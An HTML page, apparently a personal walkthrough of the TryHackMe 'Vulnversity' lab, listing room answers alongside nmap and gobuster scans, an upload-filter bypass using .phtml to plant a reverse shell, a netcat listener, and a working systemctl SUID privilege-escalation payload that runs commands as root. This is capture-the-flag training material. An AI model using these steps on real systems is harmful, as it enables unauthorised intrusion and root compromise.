@@ -1,0 +1,231 @@
+<!DOCTYPE html>
+
+
+<html lang="en">
+  <head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+    <title>MacTecLab vulnversity walkthrough tryhackme</title>
+
+    <!-- Bootstrap core CSS -->
+    <link href="css/bootstrap.css" rel="stylesheet">
+
+    <!-- Custom styles for this template -->
+    <link href="css/style.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/elusive-webfont.css">
+    <link href="css/animate.css" rel="stylesheet">
+    
+    <link href='http://fonts.googleapis.com/css?family=Open+Sans:300,400,700,300italic,400italic' rel='stylesheet' type='text/css'>
+    
+    <script src="js/jquery.min.js"></script>
+	<script type="text/javascript" src="js/modernizr.custom.js"></script>
+    
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+      <script src="js/html5shiv.js"></script>
+      <script src="js/respond.min.js"></script>
+    <![endif]-->
+  </head>
+
+  <body data-spy="scroll" data-offset="0" data-target="#navbar-main">
+  
+
+  	<div id="navbar-main">
+      <!-- Fixed navbar -->
+	    <div class="navbar navbar-default navbar-fixed-top">
+	      <div class="container">
+	        <div class="navbar-header">
+	          <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+	          	<i class="el-icon-lines"></i>
+	          </button>
+	          <a class="navbar-brand hidden-xs hidden-sm" href="#home"><h1> Mac Tec Lab</h1></a>
+	        </div>
+	        <div class="navbar-collapse collapse">
+	          	<ul class="nav navbar-nav">
+		            <li><a href="#home" class="smoothScroll">Home</a></li>
+					
+									
+					
+					
+					
+					
+				</ul>
+	        </div><!--/.nav-collapse -->
+	      </div>
+	    </div>
+    </div>
+
+  
+  
+		<!-- ==== HEADERWRAP ==== -->
+	    <div id="headerwrap" id="home" name="home">
+			<header class="clearfix">
+	  		 		<h1 class="animated bounceIn">welcome <br>to the <br>MAC TEC LAB</h1>
+	  		 		
+	  		</header>	    
+	    </div><!-- /headerwrap -->
+
+	<div>
+		<style>
+			h1{text-align: center;
+				font-style: italic;
+				font-size: 40px}
+		</style>
+
+		<h1  style="color: red"><u>VULNVERSITY WALKTHROUGH</u></h1>
+</div>	
+		
+		
+  
+<style>
+	img {
+  display: block;
+  margin-left: auto;
+  margin-right: auto;
+}
+	p {text-align: center;}
+	h2 {text-align: center;
+		font-size: 20px}
+	h3 {text-align: center;
+		font-size: 40px}
+	h4 {text-align: center;
+		font-size: 40px}
+	h5 {text-align: center;
+		font-size: 40px}
+	h6 {text-align: center;
+		font-size: 40px}
+	
+
+</style>
+<p>**********************************************************************************************************</p>
+<h3><b>[Task 1] Deploy the machine</b></h3><p>##1 Deploy the machines</p>
+<h4><b>[Task 2] Reconnaissance</b></h4>
+<p><b>use the nmap tool</b> <br>nmap -sV 10.10.130.49 =>>for services version detection 
+<br><b>##1 Scan the box, how many ports are open?</b><br>
+
+<b>ans:</b> 6</p>
+<p><b>##2 What version of the squid proxy is running on the machine?
+
+</b>
+<br><b>ans:</b> 3.5.12</p>
+<p><b>##3 How many ports will nmap scan if the flag -p-400 was used?</b><br><b>ans:</b> 400</p>
+<p><b>##4 Using the nmap flag -n what will it not resolve?</b><br><b>ans:</b>dns</p>
+<p><b>##5 What is the most likely operating system this machine is running?<br>for this we have to run the nmap tool again geting the information about operating system so we use the command <br>nmap -o [ip]<br>ans:</b>ubuntu</p>
+<p><b>##6 What port is the web server running on? <br>ans:</b>3333</p>
+
+
+<h2>when using the nmap tool you have to scan<br> all the ports and thoroughly understand <br>the reconnaissance result(always look <br>for higher ports)
+alwasys use the full nmap scan command <br><b>nmap -sV -p- -Pn -A -sC -o [ip]</b></h2>
+<br>
+<h5><b>[Task 3] locating directories</b></h5>
+<br>
+<p>|||[when we are connecting the webpage try to mention the port]|||
+	<br>here we are using the gobuster tool for finding the hidden directories.
+	<br>gobuster dir -u http://[ip]/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+</b></p>
+
+<p>
+	<b>##1 What is the directory that has an upload form page?<br>ans:</b>/internal
+</p>
+
+<h6>[Task 4] Compromise the webserver</h6>
+<br>
+<p><b>#1 Try upload a few file types to the server, what common extension seems to be blocked?</b></p>
+<p>for this task we have to upload different types of files with different types of extension</p>
+<p><b>ans:</b>.php</p>
+<br>
+<p><b>#2 To identify which extensions are not blocked, we are going to fuzz the upload form.</b></p>
+<p>while we uploading different types of files we should know that which extention is not blocking
+</p>
+<p><b>ans:</b>.phtml</p>
+
+		<p>And uploaded files are shown in
+			<b>http://[ip]:3333/inernal/uploads
+</b></p>
+<p>so we can upload the files with the extention <b>.phtml</b> ,and i am decided to upload a <b>reverse shell</b>  on the target</p>
+<br>
+<p style="font-size: 20px"><b>to get the reverse connection i use the netcat 
+	<br>nc -nlvp [port] </b></p>
+	<p>by double clicking the uploaded file that will activate the reverse shell</p>
+	<img src="/images/1*kQhWlS7NoUeTQsCpS4dF-Q.png" >
+	<br>
+	<p><b>#3 What user was running the web server?
+
+<br>ans:</b>ls -la /home</p>
+<img src="/images/2.png">
+<p><b>ans:</b>bill</p>
+<br>
+<p><b>#4 What is the user flag?<br>ans:</b>cat /home/bill/user.txt</p>
+<br>
+<h3><b>[Task 5] Privilege Escalation</b></h3>
+		<p><b>In Linux, SUID (set owner userId upon execution) is a special <br>type of file permission given to a file.<br> SUID gives temporary permissions to a user to run the program/file with the permission<br> of the file owner (rather than the user <br>who runs it).<br> ==>> find / -perm -u=s -type f 2>/dev/null
+<br>this comand will discover<br> all the nessesorry files to run 
+and<br> we got the systemctl location<br>
+ 
+ /bin/systemctl<br>
+
+then its time to privilage escalation<br>
+
+we can not read the root.txt directly<br> 
+
+run this to read the root flag
+</b></p>
+<br>
+<p style="font-size: 25px">
+	------------------------------------------------------------------<br><b>eop=$(mktemp).service<br><br>
+
+echo '[Service]<br><br>
+
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"<br><br>
+
+[Install]
+
+WantedBy=multi-user.target' >$eop<br><br>
+
+/bin/systemctl link $eop<br><br>
+
+/bin/systemctl enable --now $eop</b><br>
+-------------------------------------------------------------------------
+</p>
+		<p><b>runs each by each and got the service activated<br>
+
+        return to the home by cd /home<br>
+
+        and goes to cd /tmp<br>
+         ls ==>to show all the files <br>
+         seen the output<br>
+         cat output ==>got the root flag</b></p>
+<p><b>**********************************************************************************************************</b></p>
+		
+		
+					
+
+		
+
+		
+		<!-- ==== SECTION DIVIDER6 ==== -->
+		
+		
+		<div class="container" id="contact" name="contact">
+			<div class="row row white">
+			<br>
+				<h1 class="centered fade-down">THANKS FOR VISITING</h1>
+				<hr class="fade-down title-mb">
+				
+				
+				
+			</div><!-- row -->
+		
+		</div><!-- container -->
+
+		
+
+    <!-- Bootstrap core JavaScript
+    ================================================== -->
+    <!-- Placed at the end of the document so the pages load faster -->
+	<script type="text/javascript" src="js/bootstrap.js"></script>
+    <script type="text/javascript" src="js/plugins.js"></script>
+	<script type="text/javascript" src="js/init.js"></script>
+  </body>
+</html>
